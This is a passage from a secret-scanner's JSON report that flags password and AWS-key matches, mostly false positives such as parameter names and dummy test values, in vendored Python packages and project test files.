            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersasl.py",
            "type": "passwords",
            "line": 264,
            "severity": "CRITICAL",
            "context": "ID(\"test@example.com\")\n        self.authenticator.password = \"secret\"\n\n        self.assertRaises(\n            sasl.SASL"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersasl.py",
            "type": "passwords",
            "line": 275,
            "severity": "CRITICAL",
            "context": "jid.JID(\"example.com\")\n        self.authenticator.password = \"secret\"\n\n        self.assertRaises(\n            sasl.SASL"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersaslmechanisms.py",
            "type": "passwords",
            "line": 145,
            "severity": "CRITICAL",
            "context": "VqTrRk\"\n\n        username = \"\\u0418chris\"\n        password = \"\\u0418secret\"\n        host = \"\\u0418elwood.innosoft.com\"\n      "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbercomponent.py",
            "type": "passwords",
            "line": 32,
            "severity": "CRITICAL",
            "context": "stream.Authenticator()\n        self.authenticator.password = \"secret\"\n        self.xmlstream = xmlstream.XmlStream(self"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/im/ircsupport.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "nickname = self.account.username\n            self.password = self.account.password\n            self.realname = \"Twisted-IM user\"\n\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/im/interfaces.py",
            "type": "passwords",
            "line": 37,
            "severity": "CRITICAL",
            "context": "lean\n        @type username: string\n        @type password: string\n        @type host: string\n        @type port: in"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/im/basesupport.py",
            "type": "passwords",
            "line": 163,
            "severity": "CRITICAL",
            "context": "gin\n        self.username = username\n        self.password = password\n        self.host = host\n        self.port = port"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/xmlstream.py",
            "type": "passwords",
            "line": 71,
            "severity": "CRITICAL",
            "context": "am password: The password to be hashed.\n    @type password: C{unicode}.\n    \"\"\"\n    if not isinstance(sid, str):\n        "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/component.py",
            "type": "passwords",
            "line": 39,
            "severity": "CRITICAL",
            "context": "ent.\n    @type componentid: L{unicode}\n    @param password: password used to authenticate to the server.\n    @type pas"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/component.py",
            "type": "passwords",
            "line": 40,
            "severity": "CRITICAL",
            "context": "ord used to authenticate to the server.\n    @type password: C{str}\n    \"\"\"\n    a = ConnectComponentAuthenticator(com"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/component.py",
            "type": "passwords",
            "line": 92,
            "severity": "CRITICAL",
            "context": " this component wishes to bind to.\n\n        @type password: C{str}\n        @param password: Password/secret this com"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/component.py",
            "type": "passwords",
            "line": 93,
            "severity": "CRITICAL",
            "context": "o.\n\n        @type password: C{str}\n        @param password: Password/secret this component uses to authenticate.\n        \"\"\"\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/component.py",
            "type": "passwords",
            "line": 97,
            "severity": "CRITICAL",
            "context": "ticator.__init__(self, componentjid)\n        self.password = password\n\n    def associateWithStream(self, xs):\n        x"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 118,
            "severity": "CRITICAL",
            "context": "   jid = self.xmlstream.authenticator.jid\n        password = self.xmlstream.authenticator.password\n\n        # Construct auth request\n        reply ="
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 198,
            "severity": "CRITICAL",
            "context": "lf, jid.host)\n        self.jid = jid\n        self.password = password\n\n    def associateWithStream(self, xs):\n        x"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 211,
            "severity": "CRITICAL",
            "context": "er?\n\n    def registerAccount(self, username=None, password=None):\n        if username:\n            self.jid.user = "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 214,
            "severity": "CRITICAL",
            "context": ":\n            self.jid.user = username\n        if password:\n            self.password = password\n\n        iq = IQ(self.xmlstream, \"set\""
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 303,
            "severity": "CRITICAL",
            "context": "nnect with.\n    @type jid: L{jid.JID}\n\n    @param password: password to authenticate with.\n    @type password: L{unico"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 304,
            "severity": "CRITICAL",
            "context": "assword: password to authenticate with.\n    @type password: L{unicode}\n\n    @param configurationForTLS: An object which "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 352,
            "severity": "CRITICAL",
            "context": "   variable.\n    @type jid: L{jid.JID}\n\n    @ivar password: password to be used during SASL authentication.\n    @type "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 353,
            "severity": "CRITICAL",
            "context": " to be used during SASL authentication.\n    @type password: L{unicode}\n    \"\"\"\n\n    namespace = \"jabber:client\"\n\n    def"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
            "type": "passwords",
            "line": 372,
            "severity": "CRITICAL",
            "context": "lf, jid.host)\n        self.jid = jid\n        self.password = password\n        self._configurationForTLS = configuration"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl.py",
            "type": "passwords",
            "line": 123,
            "severity": "CRITICAL",
            "context": "   jid = self.xmlstream.authenticator.jid\n        password = self.xmlstream.authenticator.password\n\n        mechanisms = get_mechanisms(self.xmlstre"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl_mechanisms.py",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": " password: The plain-text password.\n        @type password: L{unicode}\n        \"\"\"\n\n        self.authzid = authzid or \"\""
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl_mechanisms.py",
            "type": "passwords",
            "line": 86,
            "severity": "CRITICAL",
            "context": "        self.authcid = authcid or \"\"\n        self.password = password or \"\"\n\n    def getInitialResponse(self):\n        "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl_mechanisms.py",
            "type": "passwords",
            "line": 131,
            "severity": "CRITICAL",
            "context": "respond to a\n            challenge.\n        @type password: C{unicode}\n        \"\"\"\n        self.username = username\n    "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl_mechanisms.py",
            "type": "passwords",
            "line": 134,
            "severity": "CRITICAL",
            "context": "\"\"\"\n        self.username = username\n        self.password = password\n        self.defaultRealm = host\n\n        self.di"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl_mechanisms.py",
            "type": "passwords",
            "line": 275,
            "severity": "CRITICAL",
            "context": "rname = self.username.encode(charset)\n            password = self.password.encode(charset)\n            digest_uri = self.digest_uri.encode(c"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/_scheme_builtins.py",
            "type": "passwords",
            "line": 1004,
            "severity": "CRITICAL",
            "context": "gecos\",\n    \"passwd:gid\",\n    \"passwd:name\",\n    \"passwd:passwd\",\n    \"passwd:shell\",\n    \"passwd:uid\",\n    \"pause"
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "type": "passwords",
            "line": 128,
            "severity": "CRITICAL",
            "context": "       \"\"\"Test secure password hashing\"\"\"\n        password = \"test_password_123!\"\n        \n        # Should use strong hashing (bcr"
          },
          {
            "file": "tests/e2e/test_real_world_scenarios.py",
            "type": "aws_keys",
            "line": 198,
            "severity": "CRITICAL",
            "context": "          \"AWS_REGION\": \"us-east-1\",\n            \"AWS_ACCESS_KEY_ID\": \"test-key\",\n            \"AWS_SECRET_ACCESS_KEY\""
          },
          {
            "file": "tests/e2e/test_real_world_scenarios.py",
            "type": "aws_keys",
            "line": 199,
            "severity": "CRITICAL",
            "context": "    \"AWS_ACCESS_KEY_ID\": \"test-key\",\n            \"AWS_SECRET_ACCESS_KEY\": \"test-secret\"\n        }\n        \n        # Appl"
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/storage/cloud_storage_server.py",
            "type": "aws_keys",
            "line": 83,
            "severity": "CRITICAL",
            "context": "s_config = {\n            \"access_key\": os.getenv(\"AWS_ACCESS_KEY_ID\"),\n            \"secret_key\": os.getenv(\"AWS_SECRE"
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/storage/cloud_storage_server.py",
            "type": "aws_keys",
            "line": 84,
            "severity": "CRITICAL",
            "context": "SS_KEY_ID\"),\n            \"secret_key\": os.getenv(\"AWS_SECRET_ACCESS_KEY\"),\n            \"region\": os.getenv(\"AWS_DEFAULT_R"
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/storage/s3_server.py",
            "type": "aws_keys",
            "line": 30,
            "severity": "CRITICAL",
            "context": "elf.aws_access_key = aws_access_key or os.getenv(\"AWS_ACCESS_KEY_ID\")\n        self.aws_secret_key = aws_secret_key or"
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/storage/s3_server.py",
            "type": "aws_keys",
            "line": 31,
            "severity": "CRITICAL",
            "context": "elf.aws_secret_key = aws_secret_key or os.getenv(\"AWS_SECRET_ACCESS_KEY\")\n        self.region = region or os.getenv(\"AWS_"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/tests/test_direct.py",
            "type": "passwords",
            "line": 36,
            "severity": "CRITICAL",
            "context": "  # cffi cannot succeed\n    MISSING_CFFI = True\n\n\npwd = os.path.dirname(os.path.abspath(__file__))\n\n\ndef assert_state_equal(actual, target):\n    for"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 93,
            "severity": "CRITICAL",
            "context": "g password from keyring for %s\", url)\n            password = self.keyring.get_password(url, username)\n            if password:\n              "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 94,
            "severity": "CRITICAL",
            "context": "eyring.get_password(url, username)\n            if password:\n                return username, password\n        return None\n\n    def s"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 120,
            "severity": "CRITICAL",
            "context": "L139\n        if username is not None:\n            password = self._get_password(url, username)\n            if password is not None:\n  "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 339,
            "severity": "CRITICAL",
            "context": "etloc from the url.\n        url, netloc, url_user_password = split_auth_netloc_from_url(\n            original_url,\n        )\n\n        # St"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 344,
            "severity": "CRITICAL",
            "context": "credentials embedded in the url\n        username, password = url_user_password\n        if username is not None and password is n"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 355,
            "severity": "CRITICAL",
            "context": "nfo:\n                index_url, _, index_url_user_password = index_info\n                logger.debug(\"Found index url %s\""
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 360,
            "severity": "CRITICAL",
            "context": "er_password[0] is not None:\n            username, password = index_url_user_password\n            if username is not None and password "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 402,
            "severity": "CRITICAL",
            "context": "t credentials from original url\n        username, password = self._get_new_credentials(original_url)\n\n        # If credentials not found, use any stor"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 421,
            "severity": "CRITICAL",
            "context": "            username = username or \"\"\n            password = password or \"\"\n\n            # Store any acquired credentia"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 437,
            "severity": "CRITICAL",
            "context": "edentials for this request\n        url, username, password = self._get_url_and_credentials(req.url)\n\n        # Set the url of the request to the url "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 462,
            "severity": "CRITICAL",
            "context": "           return auth[0], auth[1], False\n        password = ask_password(\"Password: \")\n        return username, password, Tr"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 485,
            "severity": "CRITICAL",
            "context": "       if self.use_keyring:\n            username, password = self._get_new_credentials(\n                resp.url,\n                allow_n"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 492,
            "severity": "CRITICAL",
            "context": "   if not self.prompting and not username and not password:\n            return resp\n\n        parsed = urllib.parse.urlparse(resp"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 499,
            "severity": "CRITICAL",
            "context": "     save = False\n        if not username and not password:\n            username, password, save = self._prompt_for_password(parsed"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 512,
            "severity": "CRITICAL",
            "context": "           username=username,\n                    password=password,\n                )\n\n        # Consume content and "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 429,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        \"\"\"\n        Return "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 442,
            "severity": "CRITICAL",
            "context": "rev_and_auth(url.secret)\n        username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n   "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 443,
            "severity": "CRITICAL",
            "context": "    username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n        if secret_password is not None:\n  "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 445,
            "severity": "CRITICAL",
            "context": "      if secret_password is not None:\n            password = hide_value(secret_password)\n        extra_args = self.make_rev_args(username,"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        extra_args: Command"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 103,
            "severity": "CRITICAL",
            "context": "extra_args += [\"--username\", username]\n        if password:\n            extra_args += [\"--password\", password]\n\n        return extra"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 142,
            "severity": "CRITICAL",
            "context": "  keyfile: _StrOrBytesPath | None = None,\n        password: _PasswordType | None = None,\n    ) -> None:\n        return self"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 145,
            "severity": "CRITICAL",
            "context": "(\n            certfile=certfile, keyfile=keyfile, password=password\n        )\n\n    def load_default_certs(\n        se"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 843,
            "severity": "CRITICAL",
            "context": "name = prefix\n        else:\n            username, password = prefix.split(':', 1)\n    if username:\n        username = unquote"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 846,
            "severity": "CRITICAL",
            "context": "name:\n        username = unquote(username)\n    if password:\n        password = unquote(password)\n    return username, password"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
            "type": "passwords",
            "line": 83,
            "severity": "CRITICAL",
            "context": " self.username = cfg.get('username')\n        self.password = cfg.get('password')\n        self.realm = cfg.get('realm', '"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 320,
            "severity": "CRITICAL",
            "context": "      self.cert_file = cert_file\n        self.key_password = key_password\n        self.ssl_context = ssl_context\n        se"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 354,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.assert_hostname = assert_hostname\n  "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 423,
            "severity": "CRITICAL",
            "context": "         certfile=self.cert_file,\n            key_password=self.key_password,\n            ca_certs=self.ca_certs,\n            c"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 967,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.ca_certs = ca_certs\n        self.ca_"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 983,
            "severity": "CRITICAL",
            "context": "      key_file=self.key_file,\n                key_password=self.key_password,\n                cert_file=self.cert_file,\n       "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 1039,
            "severity": "CRITICAL",
            "context": "          key_file=self.key_file,\n            key_password=self.key_password,\n            **self.conn_kw\n        )\n\n        ret"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 53,
            "severity": "CRITICAL",
            "context": "   category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(userna"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 60,
            "severity": "CRITICAL",
            "context": "tin1\")\n\n    if isinstance(password, str):\n        password = password.encode(\"latin1\")\n\n    authstr = \"Basic \" + to_native_strin"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all("
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 112,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 323,
            "severity": "CRITICAL",
            "context": "thorization\"]\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, pa"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 329,
            "severity": "CRITICAL",
            "context": "f not scheme.startswith('https') and username and password:\n            headers[\"Proxy-Authorization\"] = _basic_auth_str(username, "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 214,
            "severity": "CRITICAL",
            "context": "ower().startswith(\"socks\"):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] ="
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 218,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                num_pools=self._pool_connections,"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 427,
            "severity": "CRITICAL",
            "context": "       \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers[\"Proxy-"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 69,
            "severity": "CRITICAL",
            "context": "r)\n            else prompt\n        )\n        self.password = password\n        if choices is not None:\n            self."
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 136,
            "severity": "CRITICAL",
            "context": " prompt,\n            console=console,\n            password=password,\n            choices=choices,\n            show_def"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 203,
            "severity": "CRITICAL",
            "context": "\n        \"\"\"\n        return console.input(prompt, password=password, stream=stream)\n\n    def check_choice(self, value:"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 363,
            "severity": "CRITICAL",
            "context": "umber={result}\")\n\n        while True:\n            password = Prompt.ask(\n                \"Please enter a password [cyan](m"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 370,
            "severity": "CRITICAL",
            "context": "ompt.invalid]password too short\")\n        print(f\"password={password!r}\")\n\n        fruit = Prompt.ask(\"Enter a fruit\", cho"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2109,
            "severity": "CRITICAL",
            "context": "ires a str prompt). Defaults to True.\n            password: (bool, optional): Hide typed text. Defaults to False.\n  "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2117,
            "severity": "CRITICAL",
            "context": "t, markup=markup, emoji=emoji, end=\"\")\n        if password:\n            result = getpass(\"\", stream=stream)\n        else:\n      "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
            "type": "passwords",
            "line": 385,
            "severity": "CRITICAL",
            "context": "SLContext.load_verify_locations().\n    :param key_password:\n        Optional password if the keyfile is encrypted.\n    :param "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "_socks_options[\"username\"],\n                proxy_password=self._socks_options[\"password\"],\n                proxy_rdns=self._socks"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 473,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._ctx.use_certificate_chain_file(cert"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 477,
            "severity": "CRITICAL",
            "context": "tance(password, six.binary_type):\n                password = password.encode(\"utf-8\")\n            self._ctx.set_passwd_cb(lambda"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
            "type": "passwords",
            "line": 873,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._client_cert = certfile\n        self"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
            "type": "passwords",
            "line": 231,
            "severity": "CRITICAL",
            "context": "4.b16encode(random_bytes[:8]).decode(\"utf-8\")\n    password = base64.b16encode(random_bytes[8:])  # Must be valid UTF-8\n    tempdirectory = tempfi"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/_tmpdirs.py",
            "type": "passwords",
            "line": 49,
            "severity": "CRITICAL",
            "context": "   >>> os.getcwd() == my_cwd\n    True\n    '''\n    pwd = os.getcwd()\n    d = mkdtemp()\n    os.chdir(d)\n    yield d\n   "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/gammainc_data.py",
            "type": "passwords",
            "line": 97,
            "severity": "CRITICAL",
            "context": " 0.5\n    # (DLMF 8.12.15).\n    print(__doc__)\n    pwd = os.path.dirname(__file__)\n    r = np.logspace(4, 14, 30)\n    ltheta = np.lo"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_precompute/wright_bessel_data.py",
            "type": "passwords",
            "line": 46,
            "severity": "CRITICAL",
            "context": "ef main():\n    t0 = time()\n    print(__doc__)\n    pwd = os.path.dirname(__file__)\n    eps = np.finfo(float).eps * 100\n\n    a_range "
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
            "type": "passwords",
            "line": 519,
            "severity": "CRITICAL",
            "context": " import any helper modules sitting beside it.\n    pwd = os.getcwd()\n    if setup.config.plot_working_directory is not"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/conftest.py",
            "type": "aws_keys",
            "line": 66,
            "severity": "CRITICAL",
            "context": "c/moto/issues/1924 & 1952\n    monkeypatch.setenv(\"AWS_ACCESS_KEY_ID\", \"foobar_key\")\n    monkeypatch.setenv(\"AWS_SECRE"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/conftest.py",
            "type": "aws_keys",
            "line": 67,
            "severity": "CRITICAL",
            "context": "SS_KEY_ID\", \"foobar_key\")\n    monkeypatch.setenv(\"AWS_SECRET_ACCESS_KEY\", \"foobar_secret\")\n    if is_ci_environment():\n  "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 93,
            "severity": "CRITICAL",
            "context": "g password from keyring for %s\", url)\n            password = self.keyring.get_password(url, username)\n            if password:\n              "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 94,
            "severity": "CRITICAL",
            "context": "eyring.get_password(url, username)\n            if password:\n                return username, password\n        return None\n\n    def s"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 120,
            "severity": "CRITICAL",
            "context": "L139\n        if username is not None:\n            password = self._get_password(url, username)\n            if password is not None:\n  "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 339,
            "severity": "CRITICAL",
            "context": "etloc from the url.\n        url, netloc, url_user_password = split_auth_netloc_from_url(\n            original_url,\n        )\n\n        # St"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 344,
            "severity": "CRITICAL",
            "context": "credentials embedded in the url\n        username, password = url_user_password\n        if username is not None and password is n"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 355,
            "severity": "CRITICAL",
            "context": "nfo:\n                index_url, _, index_url_user_password = index_info\n                logger.debug(\"Found index url %s\""
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 360,
            "severity": "CRITICAL",
            "context": "er_password[0] is not None:\n            username, password = index_url_user_password\n            if username is not None and password "
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 402,
            "severity": "CRITICAL",
            "context": "t credentials from original url\n        username, password = self._get_new_credentials(original_url)\n\n        # If credentials not found, use any stor"
          },
